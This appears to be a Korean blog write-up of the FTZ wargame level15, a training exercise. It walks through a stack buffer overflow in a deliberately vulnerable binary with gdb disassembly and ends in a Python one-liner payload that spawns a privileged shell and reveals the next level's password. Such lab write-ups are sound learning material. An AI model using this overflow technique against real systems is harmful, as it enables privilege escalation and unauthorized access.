@@ -1,0 +1,158 @@
+I"(<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>login as: level15 
+level15@~~~~<span class="s1">'s password: 
+[level15@ftz level15]$ ls 
+attackme  hint  public_html  tmp
+
+[level15@ftz level15]$ cat hint 
+
+#include  &lt;stdio.h&gt;
+
+main() 
+{ int crap; 
+  int *check; 
+  char buf[20]; 
+  fgets(buf,45,stdin); 
+  if (*check==0xdeadbeef) 
+   { 
+     setreuid(3096,3096); 
+     system("/bin/sh"); 
+   } 
+} 
+
+[level15@ftz level15]$
+</span></code></pre></div></div>
+
+<p>level15/guess what으로 접속하자.</p>
+
+<p>hint를 보니, level14와 거의 같다.</p>
+
+<p>다만 check가 포인터로 사용되어 deadbeef의 주소값과 비교한다.</p>
+
+<p>컴파일 후 분석해보자.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level15@ftz level15]<span class="nv">$ </span><span class="nb">cp </span>hint /tmp/bof.c 
+<span class="o">[</span>level15@ftz level15]<span class="nv">$ </span><span class="nb">cd</span> /tmp 
+<span class="o">[</span>level15@ftz tmp]<span class="nv">$ </span>gcc <span class="nt">-o</span> bof bof.c 
+<span class="o">[</span>level15@ftz tmp]<span class="nv">$ </span>gdb <span class="nt">-q</span> bof 
+<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set </span>disassembly-flavor intel 
+<span class="o">(</span>gdb<span class="o">)</span> disas main 
+Dump of assembler code <span class="k">for function </span>main: 
+0x080483b8 &lt;main+0&gt;:    push   ebp 
+0x080483b9 &lt;main+1&gt;:    mov    ebp,esp 
+0x080483bb &lt;main+3&gt;:    sub    esp,0x38 
+0x080483be &lt;main+6&gt;:    and    esp,0xfffffff0 
+0x080483c1 &lt;main+9&gt;:    mov    eax,0x0 
+0x080483c6 &lt;main+14&gt;:   sub    esp,eax 
+0x080483c8 &lt;main+16&gt;:   sub    esp,0x4 
+0x080483cb &lt;main+19&gt;:   push   ds:0x80495d4 
+0x080483d1 &lt;main+25&gt;:   push   0x2d 
+0x080483d3 &lt;main+27&gt;:   lea    eax,[ebp-56] 
+0x080483d6 &lt;main+30&gt;:   push   eax 
+0x080483d7 &lt;main+31&gt;:   call   0x80482d8  &lt;fgets&gt;
+0x080483dc &lt;main+36&gt;:   add    esp,0x10 
+0x080483df &lt;main+39&gt;:   mov    eax,DWORD PTR <span class="o">[</span>ebp-16] 
+0x080483e2 &lt;main+42&gt;:   cmp    DWORD PTR <span class="o">[</span>eax],0xdeadbeef 
+0x080483e8 &lt;main+48&gt;:   jne    0x804840f &lt;main+87&gt; 
+0x080483ea &lt;main+50&gt;:   sub    esp,0x8 
+0x080483ed &lt;main+53&gt;:   push   0xc18 
+0x080483f2 &lt;main+58&gt;:   push   0xc18 
+0x080483f7 &lt;main+63&gt;:   call   0x80482f8  &lt;setreuid&gt;
+0x080483fc &lt;main+68&gt;:   add    esp,0x10 
+0x080483ff &lt;main+71&gt;:   sub    esp,0xc 
+0x08048402 &lt;main+74&gt;:   push   0x80484c0 
+0x08048407 &lt;main+79&gt;:   call   0x80482c8  &lt;system&gt;
+0x0804840c &lt;main+84&gt;:   add    esp,0x10 
+0x0804840f &lt;main+87&gt;:   leave 
+0x08048410 &lt;main+88&gt;:   ret 
+0x08048411 &lt;main+89&gt;:   nop 
+0x08048412 &lt;main+90&gt;:   nop 
+0x08048413 &lt;main+91&gt;:   nop 
+End of assembler dump. 
+<span class="o">(</span>gdb<span class="o">)</span>
+</code></pre></div></div>
+
+<p>main+27은 fgets에 buf를 인좌로 주는 역할을 한다.</p>
+
+<p>buf의 주소값:ebp-56</p>
+
+<p>main+39에서 deadbeef와 비교할 것으로 check를 주는 것을 알 수 있다.</p>
+
+<p>check의 주소값:ebp-16</p>
+
+<p>ebp - buf = 40이므로 40개의 아무 값을 넘겨주면 되는 것을 알 수 있다.</p>
+
+<p>이제 deadbeef의 주소값을 알아보자.</p>
+
+<p>우선 attackme의 원본을 gdb하자.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level15@ftz tmp]<span class="nv">$ </span><span class="nb">cd</span> 
+<span class="o">[</span>level15@ftz level15]<span class="nv">$ </span>gdb <span class="nt">-q</span> attackme 
+<span class="o">(</span>gdb<span class="o">)</span> disas main 
+Dump of assembler code <span class="k">for function </span>main: 
+0x08048490 &lt;main+0&gt;:    push   %ebp 
+0x08048491 &lt;main+1&gt;:    mov    %esp,%ebp 
+0x08048493 &lt;main+3&gt;:    sub    <span class="nv">$0x38</span>,%esp 
+0x08048496 &lt;main+6&gt;:    sub    <span class="nv">$0x4</span>,%esp 
+0x08048499 &lt;main+9&gt;:    pushl  0x8049664 
+0x0804849f &lt;main+15&gt;:   push   <span class="nv">$0x2d</span> 
+0x080484a1 &lt;main+17&gt;:   lea    0xffffffc8<span class="o">(</span>%ebp<span class="o">)</span>,%eax 
+0x080484a4 &lt;main+20&gt;:   push   %eax 
+0x080484a5 &lt;main+21&gt;:   call   0x8048360  
+0x080484aa &lt;main+26&gt;:   add    <span class="nv">$0x10</span>,%esp 
+0x080484ad &lt;main+29&gt;:   mov    0xfffffff0<span class="o">(</span>%ebp<span class="o">)</span>,%eax 
+0x080484b0 &lt;main+32&gt;:   cmpl   <span class="nv">$0xdeadbeef</span>,<span class="o">(</span>%eax<span class="o">)</span> 
+0x080484b6 &lt;main+38&gt;:   jne    0x80484dd &lt;main+77&gt; 
+0x080484b8 &lt;main+40&gt;:   sub    <span class="nv">$0x8</span>,%esp 
+0x080484bb &lt;main+43&gt;:   push   <span class="nv">$0xc18</span> 
+0x080484c0 &lt;main+48&gt;:   push   <span class="nv">$0xc18</span> 
+0x080484c5 &lt;main+53&gt;:   call   0x8048380  
+0x080484ca &lt;main+58&gt;:   add    <span class="nv">$0x10</span>,%esp 
+0x080484cd &lt;main+61&gt;:   sub    <span class="nv">$0xc</span>,%esp 
+0x080484d0 &lt;main+64&gt;:   push   <span class="nv">$0x8048548</span> 
+0x080484d5 &lt;main+69&gt;:   call   0x8048340  
+0x080484da &lt;main+74&gt;:   add    <span class="nv">$0x10</span>,%esp 
+0x080484dd &lt;main+77&gt;:   leave 
+0x080484de &lt;main+78&gt;:   ret 
+0x080484df &lt;main+79&gt;:   nop 
+End of assembler dump. 
+<span class="o">(</span>gdb<span class="o">)</span> 
+</code></pre></div></div>
+
+<p>main+32에서 deadbeef의 주소값을 비교한다.</p>
+
+<p>이 줄의 가장 왼쪽을 보아 이 활동이 일어나는 것의 주소가 0x080484b0 인 것을 알 수 있다.</p>
+
+<p>그렇다면 deadbeef의 주소를 찾아보자.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> x/x 0x080484b0 
+0x80484b0 &lt;main+32&gt;:    0xbeef3881 
+<span class="o">(</span>gdb<span class="o">)</span> x/x 0x080484b1 
+0x80484b1 &lt;main+33&gt;:    0xadbeef38 
+<span class="o">(</span>gdb<span class="o">)</span> x/x 0x080484b2 
+0x80484b2 &lt;main+34&gt;:    0xdeadbeef 
+<span class="o">(</span>gdb<span class="o">)</span>
+</code></pre></div></div>
+
+<p>주소값을 하나하나 늘리며 확인했다.</p>
+
+<p>그러다보니 0x80484b2에서 deadbeef의 문자열이 나타나는 것을 알 게 되었다.</p>
+
+<p>그렇다면 이제 코드를 작성해보자.</p>
+
+<p>아까 알아낸 아무 값 40개와 deadbeef의 주소를 적으면 check는 deadbeef의 주소값을 가르키게 된다.</p>
+
+<p>그러므로 /bin/bash를 실행하니 클리어가 될 것이다.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level15@ftz level15]<span class="nv">$ </span><span class="o">(</span>python <span class="nt">-c</span> <span class="s1">'print"\x90"*40+"\xb2\x84\x04\x08"'</span><span class="p">;</span><span class="nb">cat</span><span class="o">)</span>|./attackme 
+<span class="nb">whoami
+
+</span>level16 
+my-pass 
+
+Level16 Password is <span class="s2">"about to cause mass"</span><span class="nb">.</span>
+</code></pre></div></div>
+
+<p>성공했다.</p>
+
+<p>level16’s password:”about to cause mass”</p>
+:ET
